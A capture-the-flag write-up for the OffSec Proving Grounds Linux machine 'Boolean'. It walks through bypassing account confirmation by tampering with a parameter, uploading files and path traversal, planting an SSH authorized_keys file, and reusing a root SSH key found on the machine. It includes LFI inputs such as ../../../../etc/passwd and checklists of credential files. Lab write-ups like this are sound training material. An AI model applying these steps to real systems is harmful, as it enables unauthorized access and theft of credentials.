---

tags:

- ctf
    
- offsec
    
- proving-grounds
    
- linux
    
- web
    
- burp-suite
    
- parameter-tampering
    
- account-confirmation-bypass
    
- file-upload
    
- file-manager
    
- lfi
    
- local-file-inclusion
    
- path-traversal
    
- ssh
    
- ssh-keys
    
- authorized-keys
    
- privilege-escalation
    
- root
    

---

# Boolean

## Overview

**Platform:** OffSec Proving Grounds  
**Operating System:** Linux  
**Initial Access:** Account confirmation bypass via parameter tampering  
**Foothold Technique:** File upload combined with LFI / path traversal  
**Lateral Access:** SSH key planting for user `remi`  
**Privilege Escalation:** Reuse of a root SSH private key found in `remi`'s files  
**Final Access:** Root

### Key Techniques

- Full TCP port enumeration
    
- Web directory enumeration
    
- User registration
    
- Burp Suite request interception
    
- Parameter tampering
    
- Account confirmation bypass
    
- Authenticated file manager access
    
- File upload
    
- Local File Inclusion
    
- Accessing user home directories
    
- SSH key generation
    
- `authorized_keys` planting
    
- SSH authentication with private keys
    
- Credential / key discovery
    
- Root SSH key reuse
    

---

# Attack Path

```text
Port Enumeration
        ↓
Discover Web Application
        ↓
Register User
        ↓
Intercept Confirmation Request
        ↓
Tamper confirmed=False → True
        ↓
Authenticated File Manager
        ↓
Upload Files
        ↓
Identify LFI / Path Traversal
        ↓
Browse /home/remi/.ssh
        ↓
Upload authorized_keys
        ↓
SSH as remi
        ↓
Discover Root SSH Key
        ↓
SSH as root
        ↓
Root Access
```

---

# 1. Initial Enumeration

Begin with a full TCP scan.

```bash
nmap -sS -vv -sV -A -p- -Pn --open 192.168.205.231
```

The scan identified three open ports.

The walkthrough then focused on the HTTP service exposed on port `80`.

---

# 2. Web Enumeration

Directory fuzzing was performed using DirBuster.

Two important pages were identified:

```text
/login.php
/register.php
```

The first step was to register a new account at:

```text
http://192.168.205.231:80/register.php
```

After registration, the account could not yet be used because it required email confirmation.

---

# 3. Account Confirmation Bypass

Burp Suite was used to intercept the relevant account request.

The response contained a parameter similar to:

```text
Confirmed: false
```

The request was sent to **Repeater** and modified by adding:

```text
&user%5Bconfirmed%5D=True
```

This caused the account confirmation status to be changed to:

```text
true
```

and allowed the account to be used.

> [!tip] Recognition Pattern  
> When registration requires email confirmation or administrator approval, inspect the underlying request for fields such as:
> 
> ```text
> confirmed
> verified
> approved
> active
> role
> admin
> status
> ```
> 
> If the server accepts client-controlled values for these fields, parameter tampering may bypass workflow restrictions.

---

# 4. Understanding the Parameter

The encoded parameter:

```text
user%5Bconfirmed%5D
```

URL-decodes to:

```text
user[confirmed]
```

The full value therefore becomes conceptually:

```text
user[confirmed]=True
```

This is typical of applications that represent nested form values using array-like parameter names.

> [!tip] Key Principle  
> Security-sensitive account properties should always be enforced server-side.
> 
> If a client can directly submit:
> 
> ```text
> confirmed=True
> ```
> 
> then the application is trusting user-controlled input to make an authorization decision.

---

# 5. Authenticated File Manager

After bypassing account confirmation, the application exposed a:

```text
File Manager
```

with file upload functionality.

A PHP webshell was uploaded.

However, clicking the uploaded PHP file resulted in the file being:

```text
downloaded
```

rather than executed by the web server.

This meant that simply uploading PHP did **not** immediately provide remote code execution.

> [!tip] Do Not Stop at Failed Webshell Execution  
> A file upload can still be valuable even when uploaded PHP is not executed.
> 
> Ask:
> 
> ```text
> Where is the file stored?
> Can I control its filename?
> Can I control its path?
> Can another application function read it?
> Can I upload configuration files?
> Can I upload SSH keys?
> ```

---

# 6. Identify Local File Inclusion

The URL structure exposed by the file manager suggested that file paths could be manipulated.

The walkthrough then applied:

```text
LFI
```

and successfully accessed local filesystem content.

This exposed a local user:

```text
remi
```

The attack could then move away from PHP execution and instead abuse direct filesystem access.

---

# 7. Local File Inclusion Concept

Local File Inclusion occurs when user-controlled input is used to determine which local file the application loads or returns.

Conceptually:

```text
Application expects:
file=document.txt

Attacker supplies:
file=../../../../etc/passwd
```

If path validation is insufficient, the application may read files outside the intended directory.

> [!tip] Recognition Pattern  
> File managers, download endpoints and document viewers are common places to test for LFI or path traversal.
> 
> Look for parameters such as:
> 
> ```text
> file=
> path=
> page=
> document=
> download=
> filename=
> folder=
> ```

---

# 8. Enumerate User Home Directories

Using the file access weakness, the walkthrough identified:

```text
/home/remi
```

and then navigated into:

```text
/home/remi/.ssh
```

This is a high-value directory because it may contain:

```text
authorized_keys
id_rsa
id_ed25519
known_hosts
config
```

The ability to write to this directory created a direct SSH persistence / access opportunity.

---

# 9. Generate an SSH Key Pair

On the attacker machine:

```bash
ssh-keygen
```

This creates a private/public key pair, commonly:

```text
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
```

The public key was copied to a file named:

```text
authorized_keys
```

using:

```bash
cp /home/yourusername/.ssh/id_rsa.pub authorized_keys
```

> [!warning] Keep the Private Key  
> Upload only the **public key** to the target.
> 
> The private key remains on the attacker machine and is used to authenticate.

---

# 10. Upload authorized_keys

Using the application's file upload / filesystem access functionality, upload:

```text
authorized_keys
```

into:

```text
/home/remi/.ssh/
```

The target path therefore becomes:

```text
/home/remi/.ssh/authorized_keys
```

If SSH accepts public-key authentication and the file permissions are valid, possession of the matching private key provides access as `remi`.

---

# 11. SSH as remi

Authenticate using the generated private key.

Conceptually:

```bash
ssh -i ~/.ssh/id_rsa remi@<TARGET>
```

This provides a stable shell as:

```text
remi
```

> [!tip] Recognition Pattern  
> Arbitrary file write into a user's `.ssh` directory can often be converted directly into shell access by planting an `authorized_keys` file.

---

# 12. Why authorized_keys Works

SSH public-key authentication works roughly as follows:

```text
Attacker Private Key
        ↓
SSH Challenge
        ↓
Target checks matching public key
        ↓
~/.ssh/authorized_keys
        ↓
Authentication succeeds
```

The private key itself does not need to exist on the target.

Only the matching public key needs to be present in:

```text
~/.ssh/authorized_keys
```

---

# 13. Privilege Escalation Enumeration

After logging in as `remi`, further enumeration was performed.

The walkthrough identified an interesting directory:

```text
/home/remi/.ssh/Keys
```

Inside it was a:

```text
root SSH key
```

This provided the privilege escalation path.

> [!tip] Credential Hunting  
> Once you obtain access to a user account, inspect:
> 
> ```text
> ~/.ssh/
> ~/Downloads/
> ~/Documents/
> ~/backup/
> ~/.config/
> ~/.bash_history
> ```
> 
> and any unusually named directories such as:
> 
> ```text
> Keys
> Credentials
> Backup
> Old
> Secrets
> ```

---

# 14. Reuse the Root SSH Key

The discovered root private key could be used to authenticate directly as:

```text
root
```

Conceptually:

```bash
ssh -i <ROOT_PRIVATE_KEY> root@<TARGET>
```

If SSH rejects the key because of local permissions, correct them first:

```bash
chmod 600 <ROOT_PRIVATE_KEY>
```

Then retry:

```bash
ssh -i <ROOT_PRIVATE_KEY> root@<TARGET>
```

---

# 15. Root Access

Verify access:

```bash
id
```

Expected:

```text
uid=0(root)
```

Also:

```bash
whoami
```

Expected:

```text
root
```

The machine is now fully compromised.

---

# Reusable Web Workflow

When dealing with a registration-based web application:

```text
Register Account
        ↓
Inspect Registration Request
        ↓
Inspect Login / Activation Workflow
        ↓
Look for Client-Controlled State
        ↓
Tamper Security-Sensitive Parameters
        ↓
Gain Additional Functionality
```

Potential fields include:

```text
confirmed
verified
approved
enabled
active
role
admin
privilege
status
```

---

# Parameter Tampering Methodology

When using Burp Suite:

```text
1. Enable Proxy interception
2. Perform the sensitive action
3. Send the request to Repeater
4. Identify interesting parameters
5. Modify one parameter at a time
6. Resend the request
7. Compare responses
8. Verify the resulting application state
```

For Boolean, the critical parameter was:

```text
user[confirmed]
```

and the supplied value was:

```text
True
```

---

# File Upload Methodology

If a web application provides file upload:

```text
Can I upload arbitrary extensions?
        ↓
Where is the file stored?
        ↓
Can I access it directly?
        ↓
Is it executed?
        ↓
If not:
    Can I read it?
    Can I control its path?
    Can I overwrite sensitive files?
    Can I combine upload with LFI?
```

Boolean demonstrates an important point:

```text
PHP upload
    ≠
automatic RCE
```

The upload capability became useful because it could be chained with filesystem access.

---

# LFI / Path Traversal Workflow

When a file download or file manager accepts a path:

```text
Identify legitimate path
        ↓
Modify filename / directory
        ↓
Test ../ traversal
        ↓
Read known file
        ↓
Enumerate filesystem
        ↓
Identify users
        ↓
Look for writable sensitive paths
```

Common test files include:

```text
/etc/passwd
/etc/hostname
/proc/self/environ
/home/<USER>/.ssh/authorized_keys
```

---

# SSH Directory Enumeration

When you discover a user's `.ssh` directory, check for:

```text
authorized_keys
id_rsa
id_rsa.pub
id_ed25519
id_ed25519.pub
config
known_hosts
Keys/
backup/
```

Potential outcomes include:

```text
Read private key
Plant public key
Discover other hosts
Discover usernames
Discover root/admin keys
```

---

# Arbitrary File Write → SSH Access

A very reusable Linux technique is:

```text
Arbitrary File Write
        ↓
Write Public Key
        ↓
/home/<USER>/.ssh/authorized_keys
        ↓
Use Matching Private Key
        ↓
SSH Access
```

Requirements:

```text
SSH running
Public-key authentication enabled
Target user's .ssh path writable
Correct ownership/permissions
Matching private key retained
```

---

# Quick Reference

## Nmap

```bash
nmap -sS -vv -sV -A -p- -Pn --open <TARGET>
```

---

## Generate SSH Keys

```bash
ssh-keygen
```

---

## Prepare authorized_keys

```bash
cp ~/.ssh/id_rsa.pub authorized_keys
```

---

## SSH as User

```bash
ssh -i ~/.ssh/id_rsa remi@<TARGET>
```

---

## Fix Private Key Permissions

```bash
chmod 600 <PRIVATE_KEY>
```

---

## SSH as Root

```bash
ssh -i <ROOT_PRIVATE_KEY> root@<TARGET>
```

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|Registration requires confirmation|Parameter tampering|
|Request includes `confirmed=false`|Attempt server-side state manipulation|
|Nested parameter like `user[confirmed]`|Modify value in Burp Repeater|
|Authenticated file manager|File upload / traversal|
|Uploaded PHP downloads instead of executes|Other uses for arbitrary upload|
|File/download URL contains path|LFI / path traversal|
|`/home/<user>` accessible|Credential and SSH enumeration|
|Writable `.ssh` directory|`authorized_keys` planting|
|SSH key discovered|Test key authentication|
|Root private key accessible|Direct root SSH access|
|Key rejected by SSH|Check `chmod 600`|

---

# Key Lessons

> [!tip] Business Logic Bugs Can Lead to Full Compromise  
> The first vulnerability in Boolean was not code execution. It was a failure to protect an account-state parameter.
> 
> That small authorization flaw unlocked functionality that exposed more powerful vulnerabilities.

> [!tip] Inspect Hidden State  
> Parameters such as `confirmed`, `approved`, or `role` should never be trusted simply because they are hidden from the normal user interface.

> [!tip] Failed Webshell Upload Is Not the End  
> If an uploaded PHP file downloads instead of executes, the upload primitive may still be extremely valuable for writing SSH keys, configuration files, scheduled tasks, or other sensitive files.

> [!tip] Chain Vulnerabilities  
> Neither the upload function nor the LFI/file manager weakness necessarily needed to provide direct RCE individually.
> 
> Together they enabled access to:
> 
> ```text
> /home/remi/.ssh/authorized_keys
> ```

> [!tip] SSH Key Planting Is a Powerful File-Write Primitive  
> If you can write arbitrary files as a user and SSH is available, `authorized_keys` should be one of the first locations you consider.

> [!tip] Always Search User Files After Initial Access  
> The final escalation did not require a kernel exploit or SUID abuse. A sensitive root SSH key had simply been left accessible within another user's directory.

> [!tip] Private Keys Are Credentials  
> Treat SSH private keys exactly like passwords.
> 
> A readable private key may immediately provide access to another user or even root.

---

# Attack Chain Summary

```text
HTTP :80
   ↓
register.php
   ↓
Account Requires Confirmation
   ↓
Burp Suite
   ↓
user[confirmed]=True
   ↓
Authenticated Account
   ↓
File Manager
   ↓
File Upload
   ↓
LFI / Path Traversal
   ↓
/home/remi/.ssh
   ↓
Upload authorized_keys
   ↓
SSH as remi
   ↓
/home/remi/.ssh/Keys
   ↓
Root SSH Private Key
   ↓
SSH as root
   ↓
ROOT
```